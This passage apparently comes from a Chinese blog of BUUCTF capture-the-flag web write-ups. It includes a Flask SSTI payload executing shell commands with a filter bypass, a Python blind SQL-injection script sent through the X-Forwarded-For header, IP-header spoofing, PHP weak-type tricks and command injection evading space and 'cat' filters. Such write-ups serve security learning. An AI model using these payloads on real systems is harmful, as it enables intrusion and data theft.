        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span> <span class="token string">'flag_2sln2ndln2klnlksnf.php'</span><span class="token punctuation">;</span>
        <span class="token variable">$cipher</span> <span class="token operator">=</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$decr</span> <span class="token operator">===</span> <span class="token variable">$cipher</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token constant">WHAT_YOU_WANT</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'爬'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Refresh:0.1;url=index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//I heard you can break PHP mt_rand seed</span>
    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token delimiter">?></span></code></pre>
<p>虽然看到mt_srand很亲切，但很遗憾这次是真随机数。</p>
<p>得到flag的条件</p>
<pre class=" language-php"><code class="language-php">    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    
    <span class="token variable">$cipher</span> <span class="token operator">=</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$decr</span> <span class="token operator">===</span> <span class="token variable">$cipher</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token constant">WHAT_YOU_WANT</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>这里有一个点，关于session绕过。</p>
<p>当删去cookie中的SESSIONID，相应的SESION文件也无法被找到。这时SESSION值为NULL。</p>
<p>这里的 $_SESSION[‘secret’]本来是真随机数，但当我们删掉sessionid时，值被转化成NULL。</p>
<p>也就变成了</p>
<pre class=" language-php"><code class="language-php">    <span class="token variable">$cipher</span> <span class="token operator">=</span> <span class="token function">aesEn</span><span class="token punctuation">(</span><span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>$cipher可知了。为：kD5ilwX8ZTfhTBAfaGiuVA==</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220172718967.png" srcset="/img/loading.gif" alt="image-20201220172718967"></p>
<p>删掉sessionid,传入cipher得到flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220172855482.png" srcset="/img/loading.gif" alt="image-20201220172855482"></p>
<p>可能会想不到记录一下：看别人wp说由于base64编码$cipher值里可能会存在有+的情况，会被识别成空格。url转一下就可以了。</p>
<h1 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h1><p><strong>考点：ssti</strong></p>
<p>名就告诉是flask。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220174556976.png" srcset="/img/loading.gif" alt="image-20201220174556976"></p>
<p>功能是一个搜索界面。查看源码，看见参数search。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220173812323.png" srcset="/img/loading.gif" alt="image-20201220173812323"></p>
<p>简单测试，存在ssti。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220174618494.png" srcset="/img/loading.gif" alt="image-20201220174618494"></p>
<p>存了几个payload试试</p>
<pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></pre><p>直接返回500。怀疑是有过滤。试了几个，globals被过滤。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220180619682.png" srcset="/img/loading.gif" alt="image-20201220180619682"></p>
<p>拼接绕一下</p>
<pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__[%27__glo%27+%27bals__%27][&#39;os&#39;].popen(&#39;ls&#39;).read()</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220180722363.png" srcset="/img/loading.gif" alt="image-20201220180722363"></p>
<pre><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__[%27__glo%27+%27bals__%27][&#39;os&#39;].popen(&#39;ls /flasklight&#39;).read()

&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__[%27__glo%27+%27bals__%27][&#39;os&#39;].popen(&#39;cat /flasklight/coomme_geeeett_youur_flek&#39;).read()</code></pre><p>得到flag</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220181317512.png" srcset="/img/loading.gif" alt="image-20201220181317512"></p>
<h1 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h1><p><strong>考点：xff注入</strong></p>
<p>这个收集信息说的怪怪的。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220183310829.png" srcset="/img/loading.gif" alt="image-20201220183310829"></p>
<p>看一眼源码。原来是记录了ip。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220183351879.png" srcset="/img/loading.gif" alt="image-20201220183351879"></p>
<p>一开始url参传了下127.0.0.1,发现也会被记录。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220183831254.png" srcset="/img/loading.gif" alt="image-20201220183831254"></p>
<p>那再试下加个xff头，多了个last ip。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220184642401.png" srcset="/img/loading.gif" alt="image-20201220184642401"></p>
<p>如果再改个新的Ip。ip再次被更新了。</p>
<p>这里就怀疑ip被存进数据库了。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220184717711.png" srcset="/img/loading.gif" alt="image-20201220184717711"></p>
<p>如果xff内的ip，比如sql，它第一次被输入会作为current ip，当输入一个不同的ip比如123，current成为123，而last变成sql。这时候sql被存入数据库，但并不会被执行。然而当我们第二次输入123时，因为和currect相同，lastip就会直接从数据库里查找，那sql也就被执行了。</p>
<p>猜测插入语句是</p>
<pre><code>INSERT INTO table_name (current-ip,last-ip ) VALUES (&#39;current-ip&#39;,&#39;last-ip&#39; );</code></pre><p>那么构造payload测试</p>
<pre><code>1’or&#39;1</code></pre><p>存完1’or’1，再存一个233。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220193759964.png" srcset="/img/loading.gif" alt="image-20201220193759964"></p>
<p>再次输入，可以看到last变成1了，确实存在注入点。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220193829996.png" srcset="/img/loading.gif" alt="image-20201220193829996"></p>
<p>（这里感觉我思路还是很乱的，之后看其他人的wp，下面这个思路就顺理成章）<img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220192558980.png" srcset="/img/loading.gif" alt="image-20201220192558980"></p>
<p>恶就恶心在它flag不在当前数据库中，哈哈^  ^。</p>
<p>直接盲注中间就不细写了。exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests


url <span class="token operator">=</span> <span class="token string">"http://node3.buuoj.cn:29831/"</span>
head <span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span>
    <span class="token string">"Cookie"</span> <span class="token punctuation">:</span> <span class="token string">"track_uuid=50983484-80d0-4c5a-fd92-8ddbc2912e95"</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">#payload1 = "0' or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),{},1))>{} or '0"</span>
<span class="token comment" spellcheck="true">#payload2 = "0' or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='F4l9_D4t4B45e')),{},1))>{} or '0"</span>
<span class="token comment" spellcheck="true">#payload3 = "0' or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F4l9_t4b1e')),{},1))>{} or '0"</span>
payload <span class="token operator">=</span> <span class="token string">"0' or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),{},1))>{} or '0"</span>

flag <span class="token operator">=</span><span class="token string">""</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    low <span class="token operator">=</span> <span class="token number">32</span>
    high <span class="token operator">=</span><span class="token number">137</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload1 <span class="token operator">=</span> payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
        head<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload1
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>
        head<span class="token punctuation">[</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">"233"</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"Last Ip: 1 "</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            high <span class="token operator">=</span> mid
        mid <span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>mid <span class="token operator">==</span><span class="token number">32</span> <span class="token operator">or</span> mid <span class="token operator">==</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    flag <span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220203552386.png" srcset="/img/loading.gif" alt="image-20201220203552386"></p>
<h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p><strong>考点：代码审计</strong></p>
<p>看源码，看来是第一层</p>
<pre class=" language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>
<span class="token comment" spellcheck="true">//1st</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

 <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">,</span> <span class="token string">'%5f'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Y0u are So cutE!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b_u_p_t'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'23333'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^23333$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b_u_p_t'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"you are going to the next ~"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">!</span><span class="token operator">--</span><span class="token operator">></span></code></pre>
<p>还是传参的.会变成_的技巧</p>
<p>payload</p>
<pre><code>?b.u.p.t=23333%0a</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220223452710.png" srcset="/img/loading.gif" alt="image-20201220223452710"></p>
<p>访问一下，再查看源码，一堆jsfuck编码，控制台解一下、</p>
<p>要post Merak.</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220223803729.png" srcset="/img/loading.gif" alt="image-20201220223803729"></p>
<p>POST完给了源码。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string">'takeip.php'</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Merak'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 

<span class="token keyword">function</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
    <span class="token variable">$v</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span> 
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
        <span class="token variable">$re</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span> <span class="token punctuation">(</span> <span class="token function">ord</span> <span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token operator">*</span><span class="token number">2</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span> 
    <span class="token keyword">return</span> <span class="token variable">$re</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string">'Local access only!'</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span>
<span class="token keyword">echo</span> <span class="token string">"Sorry,you don't have permission!  Your ip is :"</span><span class="token punctuation">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span> <span class="token operator">===</span> <span class="token string">'127.0.0.1'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'2333'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'todat is a happy day'</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"Your REQUEST is:"</span><span class="token punctuation">.</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token delimiter">?></span>  </code></pre>
<p>这就没什么了，直接构造payload</p>
<pre><code>?2333=data:text/plain,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI=

//加个头
client-ip: 127.0.0.1</code></pre><p>得到flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201220230012870.png" srcset="/img/loading.gif" alt="image-20201220230012870"></p>
<h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><p><strong>考点：intval漏洞，php弱类型</strong></p>
<p>找了一圈，没什么有效信息。</p>
<p>扫一下</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201221102817179.png" srcset="/img/loading.gif" alt="image-20201221102817179"></p>
<p>访问robots.txt，假的</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201221102908278.png" srcset="/img/loading.gif" alt="image-20201221102908278"></p>
<p>那直接看fl4g.php（本来应该是去fakeflag那个网页的头里找，这直接扫出来了</p>
<p>给了源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//level 1 </span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token markup">&lt; 2020 &amp;&amp; intval($num + 1) ></span> <span class="token number">2021</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     
        <span class="token keyword">echo</span> <span class="token string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span>
<span class="token keyword">else</span><span class="token punctuation">{</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
     <span class="token punctuation">}</span> 
<span class="token comment" spellcheck="true">//level 2 </span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">echo</span> <span class="token string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>  
    <span class="token keyword">else</span>    
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 
<span class="token comment" spellcheck="true">//get flag </span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     
        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"wctf2020"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     
        <span class="token keyword">echo</span> <span class="token string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> 
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> 
<span class="token delimiter">?></span> </code></pre>
<p>先看level1的intval,既要求num小于2020，又要求num+1大于2020。</p>
<p>intval有会返回第一次出现非数字符前面的整数的这个漏洞，从这里入手。用科学计数法绕过。</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">"1e4"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">"1e4"</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// +1后字符串型的科学计数法被强制转换为数字</span>
<span class="token delimiter">?></span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
<span class="token function">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token function">int</span><span class="token punctuation">(</span><span class="token number">10001</span><span class="token punctuation">)</span></code></pre>
<p>再看level2，要求$md5==md5($md5)，弱类型那就随便上网找一个，0e215962017（懒了，写脚本跑跑也行。</p>
<p>再看level3,这直接能执行命令了，先ls。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201221111305842.png" srcset="/img/loading.gif" alt="image-20201221111305842"></p>
<p>cat过滤了，用nl;空格过滤了，用$IFS$9。</p>
<p>最终payload</p>
<pre><code>?num=1e4&amp;md5=0e215962017&amp;get_flag=nl$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201221111717347.png" srcset="/img/loading.gif" alt="image-20201221111717347"></p>

            <hr>
          </div>
          <br>
          <div>
            <p>
            
              <span>
                <i class="iconfont icon-inbox"></i>
                
                  <a class="hover-with-bg" href="/categories/ctfweb">ctfweb</a>
                  &nbsp;
                
              </span>&nbsp;&nbsp;
            
            
              <span>
                <i class="iconfont icon-tag"></i>
                
                  <a class="hover-with-bg" href="/tags/BUUCTF">BUUCTF</a>
                
              </span>
            
            </p>
            
              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
            
          </div>
        </div>
      </div>
    </div>
    <div class="d-none d-lg-block col-lg-2 toc-container">
      
  <div id="toc">
    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
    <div id="tocbot"></div>
  </div>

    </div>
  </div>
</div>

<!-- custom -->


<!-- Comments -->
<div class="col-lg-7 mx-auto nopadding-md">
  <div class="container comments mx-auto" id="comments">
    
  </div>
</div>

    
  </main>

  
